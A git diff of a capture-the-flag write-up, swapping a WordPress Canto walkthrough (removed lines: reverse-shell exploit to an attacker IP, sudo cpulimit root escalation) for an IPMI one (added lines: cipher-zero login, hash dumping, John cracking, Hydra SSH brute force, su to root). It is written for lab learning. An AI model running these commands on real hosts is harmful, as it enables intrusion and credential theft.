@@ -187,6 +187,8 @@ Nmap done: 1 IP address (1 host up) scanned in 52.55 seconds
 
 ```
 
+# IPMI service
+
 The UDP scan reveals one open port in the top 100 which is `623`
 Searching for the service running on 623 reveals IPMI, the 
 "Intelligent Platform Management Interface" which is used for so-called "Lights-out" Management of servers. 
@@ -206,278 +208,377 @@ Using the world wide web to determine how to exploit IPMI leads us to [IPMI on H
 Additionally, there a several Manufacturare specific exploits available
 
 
+# Exploitation of IPMI
+
 Starting with the first one, let see if the target is vulnerable. To do so, we could use metasploit with
 
 ```bash
 use auxiliary/scanner/ipmi/ipmi_cipher_zero
 ```
-or simply trying to login using ipmitool
+or simply trying to login with a valid user using [ipmitool](https://www.debiantutorials.com/installing-and-using-the-ipmi-tool/)
 
 ```bash
+
+# with a valid user name, admin might be a good guess.
+
+$ ipmitool -I lanplus -C 0 -H 10.10.99.13 -U admin -P NotTheRealPassword user list 
+ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
+1                    true    false      false      Unknown (0x00)
+2   admin            true    false      true       ADMINISTRATOR
+3   analiese         true    false      true       USER
+4   briella          true    false      true       USER
+5   richardson       true    false      true       USER
+6   carsten          true    false      true       USER
+7   sibylle          true    false      true       USER
+8   wai-ching        true    false      true       USER
+9   jerrilee         true    false      true       USER
+10  glynn            true    false      true       USER
+11  asia             true    false      true       USER
+12  zaylen           true    false      true       USER
+13  fabien           true    false      true       USER
+14  merola           true    false      true       USER
+15  jem              true    false      true       USER
+16  riyaz            true    false      true       USER
+17  laten            true    false      true       USER
+18  cati             true    false      true       USER
+19  rozalia          true    false      true       USER
+20  palmer           true    false      true       USER
+21  onida            true    false      true       USER
+22  terra            true    false      true       USER
+23  ranga            true    false      true       USER
+24  harrie           true    false      true       USER
+25  pauly            true    false      true       USER
+26  els              true    false      true       USER
+27  bqb              true    false      true       USER
+28  karlotte         true    false      true       USER
+29  zali             true    false      true       USER
+30  ende             true    false      true       USER
+31  stacey           true    false      true       USER
+32  shirin           true    false      true       USER
+33  kaki             true    false      true       USER
+34  saman            true    false      true       USER
+35  kalie            true    false      true       USER
+36  deshawn          true    false      true       USER
+37  mayeul           true    false      true       USER
+38  backdoor         true    false      false      ADMINISTRATOR
+39                   true    false      false      Unknown (0x00)
+40                   true    false      false      Unknown (0x00)
+41                   true    false      false      Unknown (0x00)
+42                   true    false      false      Unknown (0x00)
+43                   true    false      false      Unknown (0x00)
+44                   true    false      false      Unknown (0x00)
+45                   true    false      false      Unknown (0x00)
+46                   true    false      false      Unknown (0x00)
+47                   true    false      false      Unknown (0x00)
+48                   true    false      false      Unknown (0x00)
+49                   true    false      false      Unknown (0x00)
+50                   true    false      false      Unknown (0x00)
+51                   true    false      false      Unknown (0x00)
+52                   true    false      false      Unknown (0x00)
+53                   true    false      false      Unknown (0x00)
+54                   true    false      false      Unknown (0x00)
+55                   true    false      false      Unknown (0x00)
+56                   true    false      false      Unknown (0x00)
+57                   true    false      false      Unknown (0x00)
+58                   true    false      false      Unknown (0x00)
+59                   true    false      false      Unknown (0x00)
+60                   true    false      false      Unknown (0x00)
+61                   true    false      false      Unknown (0x00)
+62                   true    false      false      Unknown (0x00)
+63                   true    false      false      Unknown (0x00)
 
 
 ```
 
+The output provides us with a hole list of users configured on the target. All those users might be available on ssh. 
 
+The second flaw in IPMI allows to retrieve the salted hashes of these users which can be cracked later using John. 
+To do so, we first need a clean list of usernames which can be retrieved using ipmitool and altered with grep
 
-# Searching the obvious -> Exploits
-
-Let's see if there are any known exploits for the services.
+First the usernames:
 
 ```bash
-searchsploit wordpress 6.5.3
-searchsploit apache 2.4.57
+ipmitool -I lanplus -C 0 -H 10.10.99.13 -U admin -P NotTheRealPassword user list > usernames.txt
 ```
 
-Exploits are only available for certain wordpress plugins but the apache instance looks good
-![Screenshot of the searchploit output](image5.png)
-
-![Alt text](apache_exploits.png)
-
-
-
-# Taking a look around
-
-Let's walk the application.
-
-Basically the website only consist of a initial webpage, multiple button without a function. No interaction possible.
-
-![Initial website](canto_index.png)
-
-Given the title "Canto" searchsploit may provide results based on the theme/plugin.
+Then cleaning up to build a username list which can later be used in the dumphashes scanner of metasploit
 
 ```bash
-searchsploit canto
-```
-...reveals...
+# Goal is a clean list of users, one username per line
+# print the username.txt content, grep each line beginnign with a number, cutting it  and taking the third and fouth column, remove starting and trailing whitespaces, keeping what it not empty
 
-```bash
-------------------------------------------- ---------------------------------
- Exploit Title                             |  Path
-------------------------------------------- ---------------------------------
-NetScanTools Basic Edition 2.5 - 'Hostname | windows/dos/45095.py
-Wordpress Plugin Canto 1.3.0 - Blind SSRF  | multiple/webapps/49189.txt
-Wordpress Plugin Canto < 3.0.5 - Remote Fi | php/webapps/51826.py
-------------------------------------------- ---------------------------------
-Shellcodes: No Results
-Papers: No Results
+cat usernames.txt | grep '^[0-9]' | cut -d ' ' -f 3,4 | awk '{$1=$1};1' | grep -v '^$' > usernames_clean.txt
 ```
 
-The third exploit looks promising.
-
-Alright then let's go into fuzzing for subdirectories
-
-# Subdirectory Enumeration 
-
-I'm using gobuster to enumerate the subdirectories
+Retrieving user hashes via IPMI using the metasploit scanner:
 
 ```bash
-gobuster dir -u 10.10.99.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,php,js
-```
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
 
-With this large wordlist, fuzzing takes a while but several results were provided.
-The found subdomains are:
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
 
-- /wp-content/
-- /index.php
-- /wp-includes/
-- /wp-admin/ -> admin login
-- /wp-login.php
-- /readme.html
-- /wp-trackback.php
-
-With access to the admin area we may be able to exploit the web application. 
-
-
-# Exploiting Canto
-
-To exploit Canto we run the exploit python script 51826.py after starting a netcat listener first
-
-```bash
-# Starting the listener
-nc -lnvp 4444
-
-# Running the exploit with php-reverse-shell
-
-python3 51826.py -u http://10.10.99.12 -LHOST 10.10.0.10 -s php-reverse-shell.php
-```
-**We have a shell!!!**
-
-```bash
-Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
- 19:11:40 up 10 min,  0 user,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-
-```
-
-# Look around
-
-First checking the home dirs we found "erik" 
-
-```bash
-$ pwd
-/home/erik
-$ ls -la
-total 36
-drwxr-xr-- 5 erik www-data 4096 May 12 13:56 .
-drwxr-xr-x 3 root root     4096 May 12 14:24 ..
-lrwxrwxrwx 1 root root        9 May 12 13:56 .bash_history -> /dev/null
--rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
--rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
-drwx------ 2 erik erik     4096 May 12 12:21 .cache
-drwxrwxr-x 3 erik erik     4096 May 12 12:03 .local
--rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
-drwxrwxr-x 2 erik erik     4096 May 12 17:22 notes
--rw-r----- 1 root erik       33 May 12 12:22 user.txt
-```
-
-We can see that we have no access to the user.txt which is most probably the user flag...
-Let's check out the notes:
-
-```bash
-$ cd notes
-$ ls 
-Day1.txt
-Day2.txt
-$ cat Day1.txt
-On the first day I have updated some plugins and the website theme.
-$ cat Day2.txt
-I almost lost the database with my user so I created a backups folder.
-```
-
-Alright, where might the backups be? Let's find out by googling the default place where wordpress stored DB backups.
-
-Result: Mostly in the wordpress root directory which is /var/wordpress...
-
-Let's check out /var/wordpress for that
-
-```bash
-$ cd /var/wordpress
-$ ls -la
-total 12
-drwxr-xr-x  3 root root 4096 May 12 17:14 .
-drwxr-xr-x 15 root root 4096 May 12 17:14 ..
-drwxr-xr-x  2 root root 4096 May 12 17:15 backups
-$ cd backups
-$ ls -la
-total 12
-drwxr-xr-x 2 root root 4096 May 12 17:15 .
-drwxr-xr-x 3 root root 4096 May 12 17:14 ..
--rw-r--r-- 1 root root  185 May 12 17:14 12052024.txt
-$ cat 12052024.txt
-------------------------------------
-| Users     |      Password        |
-------------|----------------------|
-| erik      | (SPOILER PROTECTION) |
-------------------------------------
-$ 
-```
-
-**We have the user's password!!!**
-
-# Log in and check out the user's land
-
-Using ssh to log into eriks account
-
-```bash
-$ ssh erik@10.10.99.12                  
-erik@10.10.99.12's password: 
-Welcome to Ubuntu 23.10 (GNU/Linux 6.5.0-28-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Tue Aug 27 07:37:37 PM UTC 2024
-
-  System load:  0.07              Processes:              113
-  Usage of /:   48.4% of 8.02GB   Users logged in:        0
-  Memory usage: 15%               IPv4 address for ens18: 10.10.99.12
-  Swap usage:   0%
+   Name                  Current Setting                            Required  Description
+   ----                  ---------------                            --------  -----------
+   CRACK_COMMON          true                                       yes       Automatically crack common passwords as they are obtained
+   OUTPUT_HASHCAT_FILE                                              no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                                 no        Save captured password hashes in john the ripper format
+   PASS_FILE             /usr/share/metasploit-framework/data/word  yes       File containing common passwords for offline cracking, one per line
+                         lists/ipmi_passwords.txt
+   RHOSTS                                                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
+                                                                              asics/using-metasploit.html
+   RPORT                 623                                        yes       The target port
+   SESSION_MAX_ATTEMPTS  5                                          yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
+   SESSION_RETRY_DELAY   5                                          yes       Delay between session retries in seconds
+   THREADS               1                                          yes       The number of concurrent threads (max one per host)
+   USER_FILE             /usr/share/metasploit-framework/data/word  yes       File containing usernames, one per line
+                         lists/ipmi_users.txt
 
 
-0 updates can be applied immediately.
+View the full module info with the info, or info -d command.
 
+# Using the clean username list as input
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set user_file usernames_clean.txt
+user_file => usernames_clean.txt
 
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings
+# Setting the hashfile for later cracking
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set output_john_file hashes
+output_john_file => hashes
 
+# Setting the target
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.99.13
+rhosts => 10.10.99.13
 
-Last login: Mon Aug 26 20:42:58 2024 from 10.10.0.10
-```
+# and go
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
 
-# User Flag
-
-Lets find the user flag for submission.
-
-```bash
-erik@canto:~$ pwd
-/home/erik
-erik@canto:~$ cat user.txt 
-SPOILER_PROTECTION
-erik@canto:~$ 
+[+] 10.10.99.13:623 - IPMI - Hash found: admin:70df6eaf020300001255f8ebe4facf1e7dc9980dda14c8f11726f5db24a35ce33dd4aee85c5f74fba123456789abcdefa123456789abcdef140561646d696e:bfd8c9e2d40a7f249b833b57561a84184f6fcd2d
+[+] 10.10.99.13:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
+[+] 10.10.99.13:623 - IPMI - Hash found: analiese:4c0e8ae38403000072a00df6a1bd057e38543132636ae141ea3459154e62000d36f1c044bac1da16a123456789abcdefa123456789abcdef1408616e616c69657365:bb44a679bdb1be57d5f5cab6b9ebfa3a74fc7689
+[+] 10.10.99.13:623 - IPMI - Hash found: briella:905fea3206040000d03bef8484aef3a3fdbc12be39cf66cc368164cc172551b112d74c192cd22a8ca123456789abcdefa123456789abcdef1407627269656c6c61:ba257f254d04463c3517bea4ef0fb66ae23805ab
+[+] 10.10.99.13:623 - IPMI - Hash found: richardson:8ab73de7880400006abf61d46e840b136df7229249a9ad75c84b843640eea042632e737d23857b09a123456789abcdefa123456789abcdef140a72696368617264736f6e:8bd81095ba887192d4583357c003705f86826efa
+[+] 10.10.99.13:623 - IPMI - Hash found: carsten:397886eb0a050000a892a2c078d6497a7544a492475eebad849141c6446e9a782afa3aaeb93f9016a123456789abcdefa123456789abcdef14076361727374656e:8b848ab1d69466d35a2fc585cd94f12fe1b8af10
+[+] 10.10.99.13:623 - IPMI - Hash found: sibylle:826e87ce8c0500007bbc6e7f1cc3271d819792660cf23f392ab73d848aee0f095f37b61c2339bacea123456789abcdefa123456789abcdef1407736962796c6c65:3ff0394fa3beb5bee65837e72777ad3ee9d9dcdc
+[+] 10.10.99.13:623 - IPMI - Hash found: wai-ching:2a797fff0e06000025567596f3280b4274661f8f1c025fa1f0e7b6056d9afcca04084c0f14d89136a123456789abcdefa123456789abcdef14097761692d6368696e67:98473e4776834c26a6c0b5646f9db0d60f659833
+[+] 10.10.99.13:623 - IPMI - Hash found: jerrilee:d4ac802890060000bc1c172472cd426be9dd67604c859514a82b787e2f78612572250e870291433ba123456789abcdefa123456789abcdef14086a657272696c6565:253bc598733be6179b413c8631dfde516193a1e0
+[+] 10.10.99.13:623 - IPMI - Hash found: glynn:e0d9af8c12070000834e34b7e22785b1e63730a40040711ebe366b997d7889aa7aacb4d1a4e64f5ca123456789abcdefa123456789abcdef1405676c796e6e:2e46cdd295836140a15984b18bfbe6b5b23db529
+[+] 10.10.99.13:623 - IPMI - Hash found: asia:b087d81d94070000c653ed941b8f5949b60ed13e7f0c2911ad624c186aceacc2b42d621f38ea83a3a123456789abcdefa123456789abcdef140461736961:f928669756f5b4d5e67f197eaba883420a86f3d8
+[+] 10.10.99.13:623 - IPMI - Hash found: zaylen:89aa54151608000080cde49c65d594005fc2aa8ee892767584c48a154e648e1c13f460a21f538ecaa123456789abcdefa123456789abcdef14067a61796c656e:c3716f0c2d22a0e1474608f6a76be2b606e5675f
+[+] 10.10.99.13:623 - IPMI - Hash found: fabien:6f3db5b898080000ecd5761b960b4eb8f19ce3a4355a5fbdf2734c45ec1afcb767eec83f39023dfba123456789abcdefa123456789abcdef140666616269656e:eb2af857dec42f32995e4ee97423fb1d7b539f91
+[+] 10.10.99.13:623 - IPMI - Hash found: merola:67b646141a09000004d5cc572497f0de606dc903759ae3f1f07b3768b1cb6a7b29177cd045cc5a5aa123456789abcdefa123456789abcdef14066d65726f6c61:374f11544158d04e50a0dd502532a2c6b510a140
+[+] 10.10.99.13:623 - IPMI - Hash found: jem:2d0f7e6d9c090000619fca1df13004a8e5509cdd048a2773e27ff59ed0a6c49928c4e651c2639c81a123456789abcdefa123456789abcdef14036a656d:121fa4452cf58fefc76a09b3a13b0a6d79a7929e
+[+] 10.10.99.13:623 - IPMI - Hash found: riyaz:8fc0ded71e0a00004fd4633687529479caf34a5aaa63e5fd2b5bfa8eb4a8a89885cb595a13739c55a123456789abcdefa123456789abcdef1405726979617a:b8a13670908a52d6c0c5b942232598c82b4b0bbc
+[+] 10.10.99.13:623 - IPMI - Hash found: laten:a34d1f66a00a00005b06e3b2315fa3aa68ab49857e71e2a7ca9c04c1b593b9d5bb25f0fff5bcf77ca123456789abcdefa123456789abcdef14056c6174656e:fdb6141fd352902932d23e26c5d134653a300c36
+[+] 10.10.99.13:623 - IPMI - Hash found: cati:edaf1b72220b00005872bb74b192b620540514897916f89ac172944578a4965774a16e2efdaad0e6a123456789abcdefa123456789abcdef140463617469:70e2df61a0bdc9c12da2e8a8fcdde70e00eabff2
+[+] 10.10.99.13:623 - IPMI - Hash found: rozalia:5fcadcfaa40b00005506411411e74eca67be8c73a2d12e89a5e9faeeeff71d8fa61e45715df9374ca123456789abcdefa123456789abcdef1407726f7a616c6961:305e5fb32dbde6e3bd722036b8886d88b8de5964
+[+] 10.10.99.13:623 - IPMI - Hash found: palmer:e02125da260c0000e0e9dee3720688af235336cad01ecd36db0c5f14e205371ff87018587d5bf307a123456789abcdefa123456789abcdef140670616c6d6572:aeaead32789400020ceaaa231544afd63dcbf3de
+[+] 10.10.99.13:623 - IPMI - Hash found: onida:a7e1ddd9a80c0000c75f7357e6e8b2509d8e53025765a70138ca6f5b87832daedaea8752541a0689a123456789abcdefa123456789abcdef14056f6e696461:f34e82f039b56d5b6a1e01a6fab143ba245c3339
+[+] 10.10.99.13:623 - IPMI - Hash found: terra:8d5a35262a0d00007425788738ed00abbb8c2d43ddd99bbaa2e65704e6616a6a3e07e4d36a794f15a123456789abcdefa123456789abcdef14057465727261:57e3e99e7032c59e8b48ae5405a0d9cbb8cefe59
+[+] 10.10.99.13:623 - IPMI - Hash found: ranga:bf917201ac0d0000a1f129cee3f4650818223a09d0c9472a3676dfb1dc9fa6e918a3cc9ea41b147da123456789abcdefa123456789abcdef140572616e6761:4282665a44facd0bc716315d1914d578b7633824
+[+] 10.10.99.13:623 - IPMI - Hash found: harrie:09d0dcc92e0e000062682af4bc167b87e070cd2ef910d4a799dd426330295e858e2b1857983282a5a123456789abcdefa123456789abcdef1406686172726965:6f36a926c2d1e75bcc0d965e3f9d4ef1154eb84a
+[+] 10.10.99.13:623 - IPMI - Hash found: pauly:ff7088e0b00e00007a216d03356594777898a95468ba6959b22b856f9fae4a9e34c4e57cabb10926a123456789abcdefa123456789abcdef14057061756c79:216937b57a3235478202fc37c37a96e35d1d8c43
+[+] 10.10.99.13:623 - IPMI - Hash found: els:01d9f96c320f0000365a21c5f0497002f4bd6ba2fd787f18217a02de9899bdd76f4dc68e64b703bca123456789abcdefa123456789abcdef1403656c73:5d8d58d21daf2b10204789e281645033a67bb2cc
+[+] 10.10.99.13:623 - IPMI - Hash found: bqb:1d52ad88b40f0000200419b7a0edabfa744022e3d13f7b94a8ffe433925a34f6a2dbb899687f497ea123456789abcdefa123456789abcdef1403627162:64137ee230e82c530e5d65bab5673cf761ffe24e
+[+] 10.10.99.13:623 - IPMI - Hash found: karlotte:2339dcdb36100000602b1a8e86d3b7dd72546f5c70e6aa9eee92309602102b98f629f94669d7911ea123456789abcdefa123456789abcdef14086b61726c6f747465:bfb4565083664597ba86baa315f6625cd3254e0e
+[+] 10.10.99.13:623 - IPMI - Hash found: zali:4350122ab810000020024a108d756f3513cbb9b9a7e28a1dce6606cabc2f4126b434b07778ee4612a123456789abcdefa123456789abcdef14047a616c69:2ce61a02d09d327dcded8abc9db16d71b4bd6a57
+[+] 10.10.99.13:623 - IPMI - Hash found: ende:732f14793a110000ab6249f029179ce997b4b4600aa5d2f3b25a698bcb28d414b2064c8a56b6e3caa123456789abcdefa123456789abcdef1404656e6465:449a3a60452603dd0adbd9ceb14ad27199c0b47e
+[+] 10.10.99.13:623 - IPMI - Hash found: stacey:a2911195bc110000ac667a60a76555531517fd390ea75dcb34ca3278d9b752fbf8c5ea2e5364984aa123456789abcdefa123456789abcdef1406737461636579:a3beda81835c2affc85c2bc8b3864a96c326cdcf
+[+] 10.10.99.13:623 - IPMI - Hash found: shirin:8a0f16e93e12000090e99ed97d0c8a4cd16a41f5ffb1b8f0739be76c0306b9386ee34863e77661f9a123456789abcdefa123456789abcdef140673686972696e:f0497fe5fa42e6f408d6a57c6761e2df8e9bb8b9
+[+] 10.10.99.13:623 - IPMI - Hash found: kaki:70f75abdc01200006afb29a62e7826b4b1984792ec9ba05e31ac113f71a75fb4a41c2d55fd947264a123456789abcdefa123456789abcdef14046b616b69:eba29275b75c972b714a25dae174f46032f77fc2
+[+] 10.10.99.13:623 - IPMI - Hash found: saman:66c06cf9421300004e6f66807467560e3be8531b039836337914640b7df90093030d1a151c4033afa123456789abcdefa123456789abcdef140573616d616e:8063b495506902373b9f2b1e634192fdd9d001a5
+[+] 10.10.99.13:623 - IPMI - Hash found: kalie:a3fe46cbc41300008b6443a6d5e94b0214e04718477671e4d4549ae44524c8f09b02f4b553c90fbaa123456789abcdefa123456789abcdef14056b616c6965:3ce50546685a02d105241a151b733314513a06d2
+[+] 10.10.99.13:623 - IPMI - Hash found: deshawn:b48b218c46140000689fd681dc34d83aacd10fcec9d00f36c84c88aa9ab04df5d72eb3f2b1630cf2a123456789abcdefa123456789abcdef14076465736861776e:ecba90b04b02015c1a7d9730be2bf833f7e59463
+[+] 10.10.99.13:623 - IPMI - Hash found: mayeul:05a02fcac8140000b71961e77e2d1002a7873302f422d75ff2d500d83edb7aba473403358b42da5ba123456789abcdefa123456789abcdef14066d617965756c:22fb8dc38a058bfc1fcb504d8ad16ad0e4c03c89
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 
 ```
 
-**We have the user flag!**
+We found an easy one directly with "admin" and "cukorborso" but ssh into it doesn't work...
 
-# Escalating Privileges
-Now with a password we can see if we have sudo permissions somewhere
+# Hash Cracking
+
+Let's crack the hashes then:
 
 ```bash
-sudo -l
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+
+Using default input encoding: UTF-8
+Loaded 36 password hashes with 36 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 SSE2 4x])
+Will run 12 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+jaffa1           (10.10.99.13 ranga)     
+mackenzie2       (10.10.99.13 merola)     
+120691           (10.10.99.13 zaylen)     
+TWEETY1          (10.10.99.13 asia)     
+sexymoma         (10.10.99.13 terra)     
+number17         (10.10.99.13 jerrilee)     
+poynter          (10.10.99.13 zali)     
+jesus06          (10.10.99.13 briella)     
+trick1           (10.10.99.13 laten)     
+dezzy            (10.10.99.13 els)     
+081704           (10.10.99.13 jem)     
+122987           (10.10.99.13 cati)     
+tripod           (10.10.99.13 ende)     
+290992           (10.10.99.13 bqb)     
+milo123          (10.10.99.13 deshawn)     
+evan             (10.10.99.13 glynn)     
+castillo1        (10.10.99.13 stacey)     
+chatroom         (10.10.99.13 fabien)     
+numberone        (10.10.99.13 kaki)     
+071590           (10.10.99.13 harrie)     
+241107           (10.10.99.13 mayeul)     
+billandben       (10.10.99.13 kalie)     
+me4life          (10.10.99.13 sibylle)     
+djones           (10.10.99.13 riyaz)     
+jiggaman         (10.10.99.13 onida)     
+phones           (10.10.99.13 palmer)     
+emeralds         (10.10.99.13 karlotte)     
+515253           (10.10.99.13 pauly)     
+honda            (10.10.99.13 analiese)     
+darell           (10.10.99.13 richardson)     
+kittyboo         (10.10.99.13 shirin)     
+2468             (10.10.99.13 carsten)     
+090506           (10.10.99.13 saman)     
+batman!          (10.10.99.13 rozalia)     
+10101979         (10.10.99.13 wai-ching)     
+cukorborso       (10.10.99.13 admin)     
+36g 0:00:00:02 DONE (2024-09-08 10:25) 16.66g/s 4187Kp/s 7372Kc/s 7372KC/s d7054677l..clecle2
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
 ```
-which results in 
+
+Alright, all cracked. Let's see if a password is reused for one of the users using ssh.
+First we need to create a "username:password" formatted list.
 
 ```bash
-erik@canto:~$ sudo -l
-Matching Defaults entries for erik on canto:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User erik may run the following commands on canto:
-    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
+john --show hashes | grep '10.10.' | cut -d ' ' -f 2 > creds_atom.txt
 ```
 
-Nice, we can run cpulimit. 
-Let's see if we can exploit the sudo capabilities. I'm using [gtfobins](https://gtfobins.github.io/#) for this.
-
-![Alt text](Screenshot_20240827_154215.png)
+# Bruteforcing SSH with Logins and Passwords
 
 
-Using the sudo option to escalate to root via sudo
+Now let's use Hydra to bruteforce the ssh login
 
 ```bash
-erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
-Process 1223 detected
-# whoami
+hydra -C creds_atom.txt ssh://10.10.99.13
+   
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-08 10:38:27
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries, ~3 tries per task
+[DATA] attacking ssh://10.10.99.13:22/
+[22][ssh] host: 10.10.99.13   login: onida   password: jiggaman
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-08 10:38:37
+```
+
+Password-reuse is not recommended... Let's see what onida is up to
+
+
+# Initial Foothold
+
+```bash
+
+$ ssh-copy-id onida@10.10.99.13
+/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/c0xwl/.ssh/id_ed25519.pub"
+/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
+/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
+onida@10.10.99.13's password: 
+
+Number of key(s) added: 1
+
+Now try logging into the machine, with:   "ssh 'onida@10.10.99.13'"
+and check to make sure that only the key(s) you wanted were added.
+
+                                                                                                                                                           
+
+$ ssh onida@10.10.99.13 
+Linux atom 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+```
+
+
+An we are in as onida. The user flag can be found directly in the user's home directory
+
+```bash
+onida@atom:~$ 
+
+```
+
+Now, let's escalate. let's see if we can sudo.
+
+
+```bash
+onida@atom:~$ sudo -l
+-bash: sudo: command not found
+```
+
+# Finding Another Hash
+
+
+Mhmm ok, before trying to find SUID, SGID or other path to escalation, let's see if we can find something interesting.
+We can find some db file in `/var/www/html/` which looks like a user database incl. some hash. 
+
+```bash
+onida@atom:~$ cd /var/www/html/
+onida@atom:/var/www/html$ cat atom-2400-database.db 
+Q�Y�&��mtableusersusersCREATE TABLE users (
+    id INTEGER PRIMARY KEY,
+    username TEXT UNIQUE NOT NULL,
+    password TEXT NOT NULL
+))=indexsqlite_autoindex_users_1user�$))�tablelogin_attemptslogin_attemptsCREATE TABLE login_attempts (
+    id INTEGER PRIMARY KEY,
+    ip_address TEXT NOT NULL,
+    attempt_time INTEGER NOT NULL
+��nKE�atom$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
+���     atom
+
+▒▒
+        onida@atom:/var/www/html$ 
+
+```
+
+We can copy the hash and try to crack it with JohnTheRipper on the attack box.
+
+```bash
+$ echo '$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm' > hash2
+
+§ john --wordlist=/usr/share/wordlists/rockyou.txt
+
+$ john --show hash2                                     
+?:madison
+
+1 password hash cracked, 0 left
+```
+
+# Horizontal Escalation
+
+Nice, we found the the password of user atom. Let's try to su into root using the password
+
+```bash
+onida@atom:/var/www/html$ su root
+Password: 
+root@atom:/var/www/html# whoami
 root
-#   
+root@atom:/var/www/html# cd /root
+root@atom:~# ls
+root.txt
+root@atom:~# cat root.txt 
+[Spoiler]
+root@atom:~# 
 ```
 
+Alright, switching user works and the flag was in /root. 
 
-**We have Root!!!**
 
-# Getting the root flag
-
-Now let's find the root flat. Most probably in a root-only dir like /root
-
-```bash
-# cd /root
-# ls
-root.txt  snap
-# cat root.txt
-SPOILER_PROTECTION
-# 
-```
-
-**We have the root flag**
-
-That's it, we're done! 
+We are done!
 
 # END
